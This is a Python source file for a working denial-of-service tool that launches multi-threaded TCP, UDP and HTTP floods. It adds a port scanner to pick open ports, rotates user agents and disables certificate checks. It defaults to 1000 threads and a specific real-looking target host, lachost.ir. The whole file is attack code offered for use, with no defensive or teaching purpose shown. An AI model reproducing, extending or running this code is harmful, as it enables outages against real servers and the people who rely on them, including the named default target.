import threading
import socket
import time
import random
import sys
import os
import ssl
import json
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor
import requests
from urllib.parse import urlparse


class AdvancedDDoSAttackTool:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.target_ip = ""
        self.target_host = ""
        self.thread_count = 0
        self.attack_method = ""
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'total_bytes_sent': 0,
            'start_time': None,
            'last_update': time.time(),
            'active_threads': 0
        }

        # Advanced configuration
        self.common_ports = [
            80, 443, 8080, 8443,  # HTTP/HTTPS
            21, 22, 23, 25, 53,   # FTP, SSH, Telnet, SMTP, DNS
            110, 143, 993, 995,   # POP3, IMAP
            2082, 2083, 2086, 2087, 2095, 2096,  # cPanel ports
            2077, 2078, 20250,    # Additional web ports
            3000, 3306, 3389,     # Node, MySQL, RDP
            5432, 5900, 6379      # PostgreSQL, VNC, Redis
        ]

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]

        self.http_methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]
        self.http_paths = ["/", "/index.html", "/wp-admin", "/api/v1/users", "/images/logo.png",
                           "/css/style.css", "/js/app.js", "/admin", "/phpmyadmin", "/.env"]

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                ADVANCED DDoS ATTACK TOOL v3.0               ║
║                   A.A.I.-01 ELITE SYSTEM                    ║
║                   MULTI-PORT ASSAULT MODE                   ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def print_colored(self, text, color_code):
        print(f"\033[{color_code}m{text}\033[0m")

    def print_live_log(self, message, log_type="info"):
        colors = {
            "success": "32;1",  # Bright Green
            "error": "31;1",    # Bright Red
            "warning": "33;1",  # Bright Yellow
            "info": "36;1",     # Bright Cyan
            "attack": "35;1",   # Bright Magenta
            "critical": "31;1;4"  # Bright Red Underlined
        }

        timestamp = time.strftime('%H:%M:%S')
        color_code = colors.get(log_type, "37;1")

        symbols = {
            "attack": "💥",
            "success": "✅",
            "error": "❌",
            "warning": "⚠️",
            "info": "ℹ️",
            "critical": "🚨"
        }

        symbol = symbols.get(log_type, "🔹")
        log_message = f"[{timestamp}] {symbol} {message}"
        self.print_colored(log_message, color_code)

    def update_stats_display(self):
        current_time = time.time()
        elapsed_time = current_time - self.stats['start_time']

        if current_time - self.stats['last_update'] >= 0.5:
            rps = self.stats['total_requests'] / \
                elapsed_time if elapsed_time > 0 else 0
            bps = self.stats['total_bytes_sent'] / \
                elapsed_time if elapsed_time > 0 else 0
            success_rate = (
                self.stats['successful_requests'] / max(1, self.stats['total_requests'])) * 100

            self.clear_screen()
            self.print_banner()

            # Main stats panel
            print("╔══════════════════════════════════════════════════════════════╗")
            print("║                      LIVE ATTACK STATS                      ║")
            print("╠══════════════════════════════════════════════════════════════╣")
            print(f"║ Target: {self.target_host:<45} ║")
            print(f"║ Method: {self.attack_method.upper():<10} Threads: {self.stats['active_threads']:<4} "
                  f"Ports: {len(self.common_ports):<3} ║")
            print("╠══════════════════════════════════════════════════════════════╣")
            print(f"║ Duration: {self.format_time(elapsed_time):<40} ║")
            print(f"║ Total Requests: {self.stats['total_requests']:<33} ║")
            print(f"║ Successful: {self.stats['successful_requests']:<7} Failed: {self.stats['failed_requests']:<9} "
                  f"Rate: {success_rate:5.1f}% ║")
            print(
                f"║ Requests/Sec: {rps:7.1f}    Bandwidth: {self.format_bytes(bps):<10}/s ║")
            print("╚══════════════════════════════════════════════════════════════╝")

            # Progress bar
            progress = min(elapsed_time / 60, 1.0)  # 1 hour max for progress
            bar_length = 50
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            print(f"\n⏳ Attack Progress: [{bar}] {progress*100:.1f}%")

            self.stats['last_update'] = current_time

    def format_time(self, seconds):
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"

    def format_bytes(self, bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes < 1024.0:
                return f"{bytes:.1f} {unit}"
            bytes /= 1024.0
        return f"{bytes:.1f} TB"

    def advanced_tcp_flood(self, thread_id):
        self.stats['active_threads'] += 1
        try:
            while self.attack_running:
                target_port = random.choice(self.common_ports)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)

                try:
                    start_conn = time.time()
                    sock.connect((self.target_ip, target_port))
                    conn_time = (time.time() - start_conn) * 1000

                    self.stats['successful_requests'] += 1
                    self.print_live_log(
                        f"T{thread_id}: TCP connected to port {target_port} in {conn_time:.0f}ms", "success")

                    # Send multiple packets per connection
                    for packet_num in range(random.randint(10, 50)):
                        if not self.attack_running:
                            break

                        packet_size = random.randint(512, 2048)
                        packet_data = random._urandom(packet_size)
                        sock.send(packet_data)

                        self.stats['total_requests'] += 1
                        self.stats['total_bytes_sent'] += packet_size

                        if packet_num % 10 == 0:
                            self.print_live_log(
                                f"T{thread_id}: Sent {packet_num+1} packets to port {target_port}", "attack")

                except socket.timeout:
                    self.stats['failed_requests'] += 1
                    self.print_live_log(
                        f"T{thread_id}: TCP timeout on port {target_port}", "error")
                except Exception as e:
                    self.stats['failed_requests'] += 1
                    if "refused" not in str(e).lower():
                        self.print_live_log(
                            f"T{thread_id}: TCP error on port {target_port} - {str(e)[:50]}", "error")
                finally:
                    sock.close()

        except Exception as e:
            self.print_live_log(
                f"T{thread_id}: Critical TCP error - {str(e)}", "critical")
        finally:
            self.stats['active_threads'] -= 1

    def advanced_udp_flood(self, thread_id):
        self.stats['active_threads'] += 1
        try:
            while self.attack_running:
                target_port = random.choice(self.common_ports)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.5)

                try:
                    # Send multiple UDP packets
                    for packet_num in range(random.randint(20, 100)):
                        if not self.attack_running:
                            break

                        packet_size = random.randint(128, 1024)
                        packet_data = random._urandom(packet_size)
                        sock.sendto(packet_data, (self.target_ip, target_port))

                        self.stats['total_requests'] += 1
                        self.stats['successful_requests'] += 1
                        self.stats['total_bytes_sent'] += packet_size

                        if packet_num % 25 == 0:
                            self.print_live_log(
                                f"T{thread_id}: Sent {packet_num+1} UDP packets to port {target_port}", "attack")

                except Exception as e:
                    self.stats['failed_requests'] += 1
                    self.print_live_log(
                        f"T{thread_id}: UDP error on port {target_port}", "error")
                finally:
                    sock.close()

        except Exception as e:
            self.print_live_log(
                f"T{thread_id}: Critical UDP error - {str(e)}", "critical")
        finally:
            self.stats['active_threads'] -= 1

    def advanced_http_flood(self, thread_id):
        self.stats['active_threads'] += 1
        try:
            while self.attack_running:
                target_port = random.choice([80, 443, 8080, 8443])
                protocol = "https" if target_port in [443, 8443] else "http"

                try:
                    # Prepare HTTP request
                    method = random.choice(self.http_methods)
                    path = random.choice(self.http_paths)
                    user_agent = random.choice(self.user_agents)

                    headers = {
                        'User-Agent': user_agent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }

                    if method == "POST":
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        data = f"data={random._urandom(100).hex()}"
                    else:
                        data = None

                    # Send request
                    start_time = time.time()
                    response = requests.request(
                        method=method,
                        url=f"{protocol}://{self.target_host}{path}",
                        headers=headers,
                        data=data,
                        timeout=3,
                        verify=False
                    )
                    response_time = (time.time() - start_time) * 1000

                    self.stats['total_requests'] += 1
                    self.stats['successful_requests'] += 1
                    self.stats['total_bytes_sent'] += len(
                        str(headers)) + len(data) if data else 0

                    self.print_live_log(
                        f"T{thread_id}: HTTP {method} to {path} - Status {response.status_code} in {response_time:.0f}ms", "success")

                except requests.exceptions.Timeout:
                    self.stats['failed_requests'] += 1
                    self.print_live_log(
                        f"T{thread_id}: HTTP timeout on port {target_port}", "error")
                except Exception as e:
                    self.stats['failed_requests'] += 1
                    if "refused" not in str(e).lower() and "resolve" not in str(e).lower():
                        self.print_live_log(
                            f"T{thread_id}: HTTP error - {str(e)[:50]}", "error")

        except Exception as e:
            self.print_live_log(
                f"T{thread_id}: Critical HTTP error - {str(e)}", "critical")
        finally:
            self.stats['active_threads'] -= 1

    def mixed_attack(self, thread_id):
        """Combined attack using all methods"""
        self.stats['active_threads'] += 1
        attack_methods = [self.advanced_tcp_flood,
                          self.advanced_udp_flood, self.advanced_http_flood]

        try:
            while self.attack_running:
                # Randomly choose attack method
                attack_func = random.choice(attack_methods)
                attack_func(thread_id)

        except Exception as e:
            self.print_live_log(
                f"T{thread_id}: Critical mixed attack error - {str(e)}", "critical")
        finally:
            self.stats['active_threads'] -= 1

    def stats_monitor(self):
        """Real-time statistics monitor"""
        while self.attack_running:
            self.update_stats_display()
            time.sleep(0.3)  # Update every 300ms for smoother display

    def port_scanner(self):
        """Scan which ports are open before attack"""
        self.print_live_log("Starting port scan...", "info")
        open_ports = []

        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None

        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(scan_port, self.common_ports)
            open_ports = [port for port in results if port is not None]

        if open_ports:
            self.print_live_log(
                f"Found {len(open_ports)} open ports: {open_ports}", "success")
            self.common_ports = open_ports  # Focus on open ports
        else:
            self.print_live_log(
                "No open ports found, using all common ports", "warning")

        return open_ports

    def start_attack(self):
        self.clear_screen()
        self.print_banner()

        # Show attack configuration
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                    ATTACK CONFIGURATION                     ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║ Target: {self.target_host:<45} ║")
        print(f"║ IP: {self.target_ip:<47} ║")
        print(f"║ Method: {self.attack_method.upper():<10} Threads: {self.thread_count:<6} "
              f"Ports: {len(self.common_ports):<3} ║")
        print("╚══════════════════════════════════════════════════════════════╝")

        # Port scanning
        self.print_live_log("Phase 1: Port scanning...", "info")
        open_ports = self.port_scanner()
        time.sleep(2)

        # Initialize stats
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'total_bytes_sent': 0,
            'start_time': time.time(),
            'last_update': time.time(),
            'active_threads': 0
        }

        self.attack_running = True
        self.threads = []

        # Method mapping
        method_functions = {
            'tcp': self.advanced_tcp_flood,
            'udp': self.advanced_udp_flood,
            'http': self.advanced_http_flood,
            'mixed': self.mixed_attack
        }

        attack_function = method_functions.get(
            self.attack_method, self.mixed_attack)

        # Start stats monitor
        stats_thread = threading.Thread(target=self.stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()

        # Start attack threads
        self.print_live_log(
            f"Phase 2: Launching {self.thread_count} attack threads...", "info")
        for i in range(self.thread_count):
            thread = threading.Thread(target=attack_function, args=(i+1,))
            thread.daemon = True
            self.threads.append(thread)
            thread.start()

        self.print_live_log(
            "Phase 3: Attack is now running at full power! 🚀", "success")
        self.print_live_log("Press Ctrl+C to stop the attack", "warning")

        # Main attack loop
        try:
            while self.attack_running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        self.attack_running = False
        self.print_live_log("🛑 Stopping attack... Please wait", "warning")

        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)

        final_duration = time.time() - self.stats['start_time']
        success_rate = (self.stats['successful_requests'] /
                        max(1, self.stats['total_requests'])) * 100

        # Final report
        self.clear_screen()
        self.print_banner()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                       FINAL BATTLE REPORT                   ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║ Duration: {self.format_time(final_duration):<40} ║")
        print(f"║ Total Requests: {self.stats['total_requests']:<33} ║")
        print(f"║ Successful: {self.stats['successful_requests']:<36} ║")
        print(f"║ Failed: {self.stats['failed_requests']:<39} ║")
        print(f"║ Success Rate: {success_rate:6.1f}%{'':<30} ║")
        print(
            f"║ Data Sent: {self.format_bytes(self.stats['total_bytes_sent']):<38} ║")
        print(
            f"║ Avg. RPS: {self.stats['total_requests']/final_duration:.1f}{'':<33} ║")
        print("╚══════════════════════════════════════════════════════════════╝")

        if success_rate > 70:
            self.print_live_log(
                "🎯 EXCELLENT - Target is heavily impacted!", "success")
        elif success_rate > 40:
            self.print_live_log(
                "⚠️ MODERATE - Target is under pressure", "warning")
        else:
            self.print_live_log(
                "💤 WEAK - Target shows strong resistance", "error")

        input("\nPress Enter to return to main menu...")
        self.show_main_menu()

    def resolve_hostname(self, hostname):
        """Resolve hostname to IP address"""
        try:
            return socket.gethostbyname(hostname)
        except socket.gaierror:
            return None

    def show_main_menu(self):
        self.clear_screen()
        self.print_banner()

        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                         MAIN MENU                           ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║ 1. 🚀 Start Advanced DDoS Attack                           ║")
        print("║ 2. ⚙️  Configure Attack Parameters                         ║")
        print("║ 3. 📊 Show Current Configuration                           ║")
        print("║ 4. 🔍 Port Scanner Only                                    ║")
        print("║ 5. ❌ Exit                                                 ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print()

        choice = input("Select option [1-5]: ").strip()

        if choice == "1":
            self.configure_attack()
        elif choice == "2":
            self.configure_parameters()
        elif choice == "3":
            self.show_configuration()
        elif choice == "4":
            self.port_scanner_only()
        elif choice == "5":
            self.print_live_log("Exiting A.A.I.-01 Elite System...", "info")
            sys.exit(0)
        else:
            self.print_live_log("Invalid option!", "error")
            time.sleep(1)
            self.show_main_menu()

    def port_scanner_only(self):
        self.clear_screen()
        self.print_banner()
        self.print_live_log("Port Scanner Mode", "info")

        target = input("Enter target hostname: ").strip()
        if not target:
            target = "lachost.ir"

        ip = self.resolve_hostname(target)
        if not ip:
            self.print_live_log("Could not resolve hostname!", "error")
            time.sleep(2)
            return self.show_main_menu()

        self.target_host = target
        self.target_ip = ip

        open_ports = self.port_scanner()

        if open_ports:
            self.print_live_log(
                f"Scan complete! Found {len(open_ports)} open ports.", "success")
            print("Open ports:", open_ports)
        else:
            self.print_live_log("No open ports found.", "warning")

        input("\nPress Enter to continue...")
        self.show_main_menu()

    def configure_parameters(self):
        self.clear_screen()
        self.print_banner()

        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                   ADVANCED CONFIGURATION                    ║")
        print("╠══════════════════════════════════════════════════════════════╣")

        # Target configuration
        self.target_host = input("║ Target Hostname [lachost.ir]: ").strip()
        if not self.target_host:
            self.target_host = "lachost.ir"

        self.target_ip = self.resolve_hostname(self.target_host)
        if not self.target_ip:
            self.print_live_log(
                "Could not resolve hostname! Using direct IP input.", "error")
            self.target_ip = input("║ Target IP: ").strip()
            if not self.validate_ip(self.target_ip):
                self.print_live_log("Invalid IP address!", "error")
                time.sleep(2)
                self.configure_parameters()
                return

        # Attack method
        print("║ Attack Methods:                                           ║")
        print("║   - tcp: Advanced TCP flood (multi-port)                 ║")
        print("║   - udp: Advanced UDP flood (multi-port)                 ║")
        print("║   - http: Advanced HTTP flood                            ║")
        print("║   - mixed: Combined attack (recommended)                 ║")
        method = input("║ Select Method [mixed]: ").strip().lower()
        if not method:
            method = "mixed"
        if method not in ['tcp', 'udp', 'http', 'mixed']:
            self.print_live_log("Invalid method! Using mixed.", "warning")
            method = "mixed"
        self.attack_method = method

        # Thread count
        try:
            threads = input("║ Thread Count [1000]: ").strip()
            self.thread_count = int(threads) if threads else 1000
            if self.thread_count < 1:
                raise ValueError
        except ValueError:
            self.print_live_log("Invalid thread count! Using 1000.", "warning")
            self.thread_count = 1000

        self.print_live_log(
            "Advanced configuration saved successfully!", "success")
        time.sleep(1)
        self.show_main_menu()

    def show_configuration(self):
        self.clear_screen()
        self.print_banner()

        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                   CURRENT CONFIGURATION                     ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(
            f"║ Target Hostname: {self.target_host if self.target_host else 'Not set':<30} ║")
        print(
            f"║ Target IP: {self.target_ip if self.target_ip else 'Not set':<35} ║")
        print(
            f"║ Attack Method: {self.attack_method if self.attack_method else 'Not set':<31} ║")
        print(
            f"║ Thread Count: {self.thread_count if self.thread_count else 'Not set':<32} ║")
        print(
            f"║ Target Ports: {len(self.common_ports)} common ports{'':<20} ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print()

        input("Press Enter to return to main menu...")
        self.show_main_menu()

    def configure_attack(self):
        if not all([self.target_host, self.target_ip, self.attack_method, self.thread_count]):
            self.print_live_log(
                "Please configure all parameters first!", "warning")
            time.sleep(2)
            self.configure_parameters()
            return

        self.start_attack()

    def validate_ip(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def run(self):
        try:
            self.clear_screen()
            self.print_banner()
            self.print_live_log(
                "A.A.I.-01 Elite System Initialized", "success")
            self.print_live_log(
                "Ready to execute ABSOLUTE-01 commands", "info")
            self.print_live_log("Multi-port assault mode activated", "attack")
            time.sleep(2)

            # Set default values
            self.target_host = "lachost.ir"
            self.target_ip = self.resolve_hostname(self.target_host)
            self.attack_method = "mixed"
            self.thread_count = 1000

            if not self.target_ip:
                self.print_live_log(
                    "Could not resolve lachost.ir! Please configure manually.", "error")
                self.target_host = ""
                self.target_ip = ""

            self.show_main_menu()
        except KeyboardInterrupt:
            self.print_live_log("System shutdown by user", "warning")
            sys.exit(0)
        except Exception as e:
            self.print_live_log(f"System error: {str(e)}", "error")
            sys.exit(1)


if __name__ == "__main__":
    # Disable SSL warnings for HTTP attacks
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    tool = AdvancedDDoSAttackTool()
    tool.run()
